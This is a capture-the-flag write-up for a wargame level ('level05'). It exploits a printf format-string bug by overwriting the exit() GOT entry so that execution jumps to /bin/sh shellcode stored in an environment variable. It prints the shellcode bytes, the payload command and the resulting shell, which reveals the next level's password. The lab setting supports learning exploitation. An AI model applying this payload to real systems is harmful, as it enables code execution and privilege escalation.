level05
=======
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

*	We have the [level05](src/level05) executable and here is the [code](src/level05.c)
*	Not much to say here
	- `printf()` which is vulnerable and a loop that turns our uppercase to lowercase
*	We could possibly try to replace `exit()` funciton call to something that would give us a shell
	```gdb
	(gdb) p exit
	$1 = {<text variable, no debug info>} 0x8048370 <exit@plt>
	(gdb) disas 0x8048370
	Dump of assembler code for function exit@plt:
	0x08048370 <+0>:     jmp    *0x80497e0
	0x08048376 <+6>:     push   $0x18
	0x0804837b <+11>:    jmp    0x8048330
	End of assembler dump.
	(gdb)
	```
	We have `exit()` address on plt.got `0x80497e0 -> [0804(HEX)2052(DEC)] [97e0(HEX)38880(DEC)]`
*	We need the index 
	```console
	level05@OverRide:~$ ./level05 
	aaaa %p %p %p %p %p %p %p %p %p %p %p 
	aaaa 0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 -->0x61616161<-- 0x20702520 
	```
	`10th` position
*	Same thing but let's add a shellcode in the environment
	```console
	level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
	level05@OverRide:~$ gdb ./level05
	(gdb) x/s *(char **)environ
	0xffffd85b:      "SHELLCODE=[...]"
	```
	We already have the address of `exit()` so all we need should be to make some calculus to find the right numbers to replace the address for the shellcode. Important thing here, the env variable starts at `0xffffd85b` but since we only want the code we need to add enough bytes to reach the code itself. We will go with `0xffffd869 -> ffff(65535) d869(55400)`
*	Then we also need to make sure to store it in two parts in `exit()`, It should be at `&exit()` and `&exit()+2` so `0x80497e0` and `0x80497e2`. Don't forget the little endian and store the last 2 bytes in the first part:
	- `d869` in `\x08\x04\x97\xe0`
	- `ffff` in `\x08\x04\x97\xe2`
*	Since we are on a `printf()` format string attack we need to have the right amount of bytes count and in decimal, the address of `exit()` already gives `8 bytes` so we remove it to because it is added in the modifier `%n`:
	- `d869 -> 55400` becomes `55392`
	- then we need to do the second part `65535` `55400` -> `10135`
*	The payload should look something like this :
	```console
	level05@OverRide:~$ python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55400d%10$hn" + "%10135d%11$hn")' > /tmp/level05
	[...]
	Segmentation fault (core dumped)
	```
	not working
*	Let's try adding some NOP-SLED to make sure we reach the right place
	```console
	level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
	level05@OverRide:~$ cat /tmp/level05 - | ./level05
	[...]
	whoami
	level06
	cd ../level06
	cat .pass
	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
	```